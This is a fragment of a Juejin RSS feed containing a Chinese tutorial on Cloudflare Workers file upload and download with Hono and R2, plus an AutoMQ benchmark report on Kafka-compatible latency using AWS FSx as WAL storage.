<p>希望这篇文章能帮你彻底厘清 MQ 幂等性的实现思路。记住：<strong>越复杂的代码越容易出 Bug，能利用数据库天然特性解决的，就不要引入外部依赖。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[cloudflare+hono使用worker实现api接口和r2文件存储和下载]]></title>    <link>https://juejin.cn/post/7595028805157912586</link>    <guid>https://juejin.cn/post/7595028805157912586</guid>    <pubDate>2026-01-14T08:37:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595028805157912586" data-draft-id="7595041883144110126" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="cloudflare+hono使用worker实现api接口和r2文件存储和下载"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-14T08:37:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="1024小神"/> <meta itemprop="url" content="https://juejin.cn/user/70007368988926"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            cloudflare+hono使用worker实现api接口和r2文件存储和下载
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/70007368988926/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    1024小神
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T08:37:12.000Z" title="Wed Jan 14 2026 08:37:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我的开源项目PakePlus可以将网页/Vue/React项目打包为桌面/手机应用并且小于5M只需几分钟，官网地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fpakeplus.com" target="_blank" title="https://pakeplus.com" ref="nofollow noopener noreferrer">pakeplus.com</a></p><p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/addad47db1a14723b55e1a6e057295a2~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="2524" loading="lazy"/></p><p/>
<p>步骤也很简单，就是使用命令创建一个hono创建一个基础框架，然后绑定r2对象存储，然后写上传和下载的接口，然后测试发布即可。</p>
<p>使用命令：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm create cloudflare@latest upload-r2</code></pre>
<p>然后创建后打开，绑定r2:</p>
<p>bucket_name 这里添加你的存储桶名称即可，没有的话，在后台页面创建一个存储桶或者使用命令行创建一个。</p>
<p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e5f5b5cf58d748ac912a4af6a724a2b7~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="1800" loading="lazy"/></p>
<p>然后运行命令：</p>
<pre><code class="hljs language-bash" lang="bash">wrangler deploy --minify</code></pre>
<p>这个主要是将绑定的存储桶R2可以在代码中使用不提示报错。</p>
<p>然后在index.ts中写上传逻辑：</p>
<pre><code class="hljs language-javascript" lang="javascript">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/upload'</span>, <span class="hljs-keyword">async</span> (c) =&gt; {
    <span class="hljs-keyword">const</span> form = <span class="hljs-keyword">await</span> c.<span class="hljs-property">req</span>.<span class="hljs-title function_">parseBody</span>()
    <span class="hljs-keyword">const</span> file = form[<span class="hljs-string">'file'</span>] <span class="hljs-keyword">as</span> <span class="hljs-title class_">File</span>
    <span class="hljs-keyword">if</span> (!file || !file.<span class="hljs-property">name</span>) {
        <span class="hljs-keyword">return</span> c.<span class="hljs-title function_">json</span>({ <span class="hljs-attr">error</span>: <span class="hljs-string">'No file uploaded'</span> }, <span class="hljs-number">400</span>)
    }
    <span class="hljs-keyword">const</span> buffer = <span class="hljs-keyword">await</span> file.<span class="hljs-title function_">arrayBuffer</span>()
    <span class="hljs-keyword">const</span> object = <span class="hljs-keyword">await</span> c.<span class="hljs-property">env</span>.<span class="hljs-property">R2</span>.<span class="hljs-title function_">put</span>(file.<span class="hljs-property">name</span>, buffer)
    <span class="hljs-keyword">return</span> c.<span class="hljs-title function_">json</span>({ object })
})</code></pre>
<p>这个代码主要就是拿到post请求中的file文件，然后使用R2存储到桶里面，写完之后会返回存储后的结果，可以本地运行测试，本地启动服务后，使用postman或者apifox都可以测试：</p>
<p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/cd9c60a4229c4e848df05ab6fb8d62fc~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="1728" loading="lazy"/></p>
<p>说明没有问题，这里可以上传任意类型的文件，访问的时候也可以访问任意类型。为什么不用Express框架？因为Express框架和cf不是很兼容，在访问视频文件或者大文件的时候，和cf不兼容，访问不到。所以强烈推荐Hono这个框架，而且Hono用起来和Express差不多，甚至更方便。</p>
<p/>
<p>然后开始写访问文件逻辑和下载逻辑：</p>
<pre><code class="hljs language-javascript" lang="javascript">app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/download/:key'</span>, <span class="hljs-keyword">async</span> (c) =&gt; {
    <span class="hljs-keyword">const</span> key = c.<span class="hljs-property">req</span>.<span class="hljs-title function_">param</span>(<span class="hljs-string">'key'</span>)
    <span class="hljs-keyword">const</span> object = <span class="hljs-keyword">await</span> c.<span class="hljs-property">env</span>.<span class="hljs-property">R2</span>.<span class="hljs-title function_">get</span>(key)
    <span class="hljs-keyword">if</span> (!object) {
        <span class="hljs-keyword">return</span> c.<span class="hljs-title function_">json</span>({ <span class="hljs-attr">error</span>: <span class="hljs-string">'File not found'</span> }, <span class="hljs-number">404</span>)
    }
    <span class="hljs-keyword">return</span> c.<span class="hljs-title function_">body</span>(object.<span class="hljs-property">body</span>)
})
</code></pre>
<p>这里主要就是发送get请求访问上传的文件，在apifox中访问刚才上传的文件：完美访问</p>
<p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f953aa4b79444e00a950c142b3d934c2~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="1526" loading="lazy"/></p>
<p/>
<p>还可以查询桶里面有哪些文件：</p>
<pre><code class="hljs language-javascript" lang="javascript">
app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/files'</span>, <span class="hljs-keyword">async</span> (c) =&gt; {
    <span class="hljs-keyword">const</span> objects = <span class="hljs-keyword">await</span> c.<span class="hljs-property">env</span>.<span class="hljs-property">R2</span>.<span class="hljs-title function_">list</span>()
    <span class="hljs-keyword">return</span> c.<span class="hljs-title function_">json</span>({ <span class="hljs-attr">files</span>: objects.<span class="hljs-property">objects</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">object</span>) =&gt;</span> object.<span class="hljs-property">key</span>) })
})</code></pre>
<p>就会返回文件列表：</p>
<p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9b72365c36674d8c849793986c3f87fa~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="1540" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[技术干货 ｜AutoMQ x AWS FSxN: 性能报告]]></title>    <link>https://juejin.cn/post/7595028805157978122</link>    <guid>https://juejin.cn/post/7595028805157978122</guid>    <pubDate>2026-01-14T08:44:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595028805157978122" data-draft-id="7595028805157879818" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="技术干货 ｜AutoMQ x AWS FSxN: 性能报告"/> <meta itemprop="keywords" content="架构"/> <meta itemprop="datePublished" content="2026-01-14T08:44:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AutoMQ"/> <meta itemprop="url" content="https://juejin.cn/user/2878958479084707"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            技术干货 ｜AutoMQ x AWS FSxN: 性能报告
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2878958479084707/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AutoMQ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T08:44:49.000Z" title="Wed Jan 14 2026 08:44:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>背景</strong></h2>
<p>AutoMQ 是一款基于 S3 构建的下一代“Diskless Kafka”，完全兼容 Kafka 协议。其云原生架构通过存算分离和按需弹性，显著提升了运维效率。最核心的突破在于，它利用共享存储消除了昂贵的跨可用区（Cross-AZ）数据传输费用，这能为多可用区集群每月节省数千甚至上万美元的网络成本。</p>
<p>在保持极致性价比的同时，AutoMQ 于 2025 年 12 月发布的版本正式引入了对 AWS FSx 作为 WAL 存储选项的支持，以进一步攻克 Diskless 架构的延迟瓶颈。这一演进使 AutoMQ 能够提供媲美本地磁盘的毫秒级延迟，同时保留零跨可用区流量成本和多可用区容灾能力，在低成本、高可靠与极致性能之间实现了完美平衡。</p>
<p>为了在真实生产环境下验证这些架构优势，我们进行了一系列性能基准测试，重点关注客户端观测到的端到端延迟。
<br/></p>
<blockquote>
<p>Tips:</p>
<ul>
<li>AutoMQ FSxN 能力的正式发布请参考文章：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgo.automq.com%2Fautomq-fsx-10ms-latency-diskless-kafka-on-aws" target="_blank" title="https://go.automq.com/automq-fsx-10ms-latency-diskless-kafka-on-aws" ref="nofollow noopener noreferrer">AutoMQ x FSx: 10ms Latency Diskless Kafka on AWS</a></li>
<li>AutoMQ FSxN 实现原理介绍请参考文章： <a href="https://link.juejin.cn?target=https%3A%2F%2Fgo.automq.com%2Fhow-does-automq-implement-sub-10ms-latency-diskless-kafka" target="_blank" title="https://go.automq.com/how-does-automq-implement-sub-10ms-latency-diskless-kafka" ref="nofollow noopener noreferrer">How does AutoMQ implement a sub-10ms latency Diskless Kafka？</a></li>
</ul>
</blockquote>
<br/>
<h2 data-id="heading-1"><strong>测试场景和结果</strong></h2>
<p>要理解测试结果，我们首先需要拆解延迟的产生环节：</p>
<h3 data-id="heading-2"><strong>延迟的构成</strong></h3>
<p>从业务视角来看，延迟主要源于两个方面：Kafka 客户端的排队延迟以及服务端的处理延迟。在接下来的章节中，我们将对这两个部分进行拆解分析，从而让大家能够清晰地理解 AutoMQ 结合 FSxN 设计对二者的具体影响。</p>
<h4 data-id="heading-3"><strong>服务端处理延迟</strong></h4>
<p>传统的 Kafka 架构服务端的主要延迟消耗在：客户端与服务的跨 AZ 通信，以及副本完成跨 AZ 复制（ACK=ALL）。这两段的跨 AZ 通信都是直接的 RPC 请求，在 AWS 上会产生高额的流量。</p>
<p>AutoMQ 从整体架构上做了一些变化：采用 AWS FSx 作为 WAL 存储，省去副本复制的流量费；同时通过 FSx 中继客户端和服务端的跨 AZ 请求，减少客户端和服务端的跨 AZ 流量费。由于增加了转发逻辑，会带来少量额外的处理延迟，但却极大的减少了流量成本。
<br/></p>
<p><img src="https://image.automq.com/20260114bot/w6tbmd.png" alt="" loading="lazy"/>
<br/></p>
<h4 data-id="heading-4">客户端排队延迟</h4>
<p>Kafka 生产者采用“先攒批、后发送”的两阶段设计：首先将消息按分区在内存中累积，当达到<code>batch.size</code> 大小或 <code>linger.ms</code> 时间则会将消息放入就绪队列等待发送；网络层在并发限制内，从队列取出批次并发送到服务端。</p>
<p>在追求极致吞吐的场景下，业务常通过调大 <code>linger.ms</code> 主动攒批，但这会导致请求在客户端排队，从而在业务视角表现为更高的延迟；通常可通过 <code>linger.ms</code> 和 <code>batch.size</code> 两个参数在吞吐与延迟之间进行权衡。这一块可以参考之前的文章，里面有详细介绍：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgo.automq.com%2Fkafka-performance-tuning-linger-ms-batch-size" target="_blank" title="https://go.automq.com/kafka-performance-tuning-linger-ms-batch-size" ref="nofollow noopener noreferrer">Kafka Performance Tuning: Best Practice for linger.ms and batch.size</a>
<br/></p>
<h3 data-id="heading-5"><strong>测试场景选择</strong></h3>
<p>为了全面、客观地评估 AutoMQ 在引入 AWS FSxN 后的性能表现，并提供具备实战参考价值的性能数据，我们将测试场景设定为两个维度：<strong>极致性能基准（Baseline）与生产稳态模型（Robustness）</strong>。
<br/></p>
<h4 data-id="heading-6"><strong>极致性能基准场景：服务端延迟物理上限测试</strong></h4>
<p>在分布式系统中，客户端的排队机制往往会掩盖存储介质真实的 I/O 响应。因此，我们首先通过设置 <code>linger.ms=0</code> 且在低并发压力下进行测试，旨在构建一个“零排队”的理想环境。</p>
<ul>
<li><strong>测试目的：</strong> 剥离客户端干扰，直接探测 AutoMQ 结合 FSxN WAL 后的<strong>服务端核心处理时延</strong>与<strong>网络中继损耗</strong>，确立该方案的物理性能边界。
<br/></li>
</ul>
<h4 data-id="heading-7"><strong>生产稳态模型场景：高吞吐下的确定性延迟测试</strong></h4>
<p>在真实的生产实践中，流量波动（Burst）、生产者扩缩容以及分区负载不均是常态。为了追求吞吐量与成本的平衡，开发者通常会通过 <code>linger.ms</code> 和 <code>batch.size</code> 进行攒批调优。</p>
<ul>
<li><strong>测试目的：</strong> 我们选取了典型的生产配置（如 <code>linger.ms=3</code>），并模拟<strong>集群满负载运行</strong>状态。此场景旨在验证在真实业务压力下，AutoMQ 是否能提供<strong>高确定性的延迟输出</strong>，并观察其在处理海量小包写入（High TPS）时的尾部延迟（P99/P999）表现。</li>
</ul>
<p>通过这两个维度的对比，我们不仅能展示该方案在理想状态下的爆发力，更能证明其在复杂生产环境下作为核心基础设施的稳定性。</p>
<h3 data-id="heading-8"><strong>详细测试</strong></h3>
<p>测试环境如下：</p>
<ul>
<li>使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fopenmessaging.cloud%2Fdocs%2Fbenchmarks%2F" target="_blank" title="https://openmessaging.cloud/docs/benchmarks/" ref="nofollow noopener noreferrer">OpenMessaging</a> 基准测试框架，写入总吞吐 300MiB/s，Fanout 比例为 1:4；</li>
<li>Server: m7g.4xlarge *3;</li>
<li>WAL Storage: FSx 736MBps、1T SSD、3072IOPS;</li>
<li>Client: m7g.4xlarge *3;</li>
<li>集群水位满载运行；
<br/></li>
</ul>
<h4 data-id="heading-9"><strong>耗时最短的场景</strong></h4>
<p>为了探测系统的物理性能上限，我们构建了一个“零排队”的理想环境，重点调整了影响时延的关键参数：</p>
<ul>
<li><code>batch.size</code>=64K、<code>linger.ms</code>=0（默认）</li>
<li>不开压缩（开启压缩会降低写入吞吐量，带来更低的写入延迟，降低测试场景的挑战）</li>
</ul>
<p>具体配置如下：</p>
<pre><code class="hljs language-ini" lang="ini">name: Kafka
driverClass: io.openmessaging.benchmark.driver.kafka.KafkaBenchmarkDriver
<span class="hljs-comment"># Kafka client-specific configuration</span>
replicationFactor: 1
topicConfig: |
  <span class="hljs-attr">min.insync.replicas</span>=<span class="hljs-number">2</span>
commonConfig: |
  <span class="hljs-attr">bootstrap.servers</span>=<span class="hljs-number">10.0</span>.<span class="hljs-number">0.112</span>:<span class="hljs-number">9092</span>
producerConfig: |
  <span class="hljs-attr">acks</span>=<span class="hljs-number">1</span>
  <span class="hljs-attr">batch.size</span>=<span class="hljs-number">65536</span>
  <span class="hljs-attr">client.id</span>=automq_type=producer&amp;automq_az=us-east-<span class="hljs-number">1</span>b
consumerConfig: |
  <span class="hljs-attr">auto.offset.reset</span>=earliest
  <span class="hljs-attr">enable.auto.commit</span>=<span class="hljs-literal">true</span>
  <span class="hljs-attr">client.id</span>=automq_type=consumer&amp;automq_az=us-east-<span class="hljs-number">1</span>b
</code></pre>
<ul>
<li>Record Size = 64 KB</li>
<li>写入 TPS = 4,800</li>
<li>分区总数 = 96</li>
<li>Producer 数量 = 48</li>
</ul>
<p>工作负载配置如下：</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">name:</span> Lowest latency <span class="hljs-keyword">case</span>
<span class="hljs-symbol">topics:</span> <span class="hljs-number">1</span>
<span class="hljs-symbol">partitionsPerTopic:</span> <span class="hljs-number">32</span>
<span class="hljs-symbol">messageSize:</span> <span class="hljs-number">65536</span>
<span class="hljs-symbol">payloadFile:</span> <span class="hljs-string">"payload/payload-64Kb.data"</span>
<span class="hljs-symbol">subscriptionsPerTopic:</span> <span class="hljs-number">4</span>
<span class="hljs-symbol">consumerPerSubscription:</span> <span class="hljs-number">16</span>
<span class="hljs-symbol">producersPerTopic:</span> <span class="hljs-number">16</span>
<span class="hljs-symbol">producerRate:</span> <span class="hljs-number">1600</span>
<span class="hljs-symbol">consumerBacklogSizeGB:</span> <span class="hljs-number">0</span>
</code></pre>
<br/>
<h5 data-id="heading-10"><strong>运行结果</strong></h5>
<p>写入总吞吐图 300MiB/s，读取约 1.2GiB/s；</p>
<p><img src="https://image.automq.com/20260114bot/vr4whu.png" alt="" loading="lazy"/></p>
<p>CPU 消耗约 27.5%，内存占用约 10G；</p>
<p><img src="https://image.automq.com/20260114bot/dnv207.png" alt="" loading="lazy"/></p>
<p>写入平均延迟 6.0ms、P99 13.11ms、P999 17.68ms；</p>
<p><img src="https://image.automq.com/20260114bot/pcnn4u.png" alt="" loading="lazy"/></p>
<p>端到端平均延迟 7.79ms、19.0ms、29.0ms；</p>
<p><img src="https://image.automq.com/20260114bot/17j6se.png" alt="" loading="lazy"/></p>
<p><img src="https://image.automq.com/20260114bot/xdkjh5.png" alt="" loading="lazy"/></p>
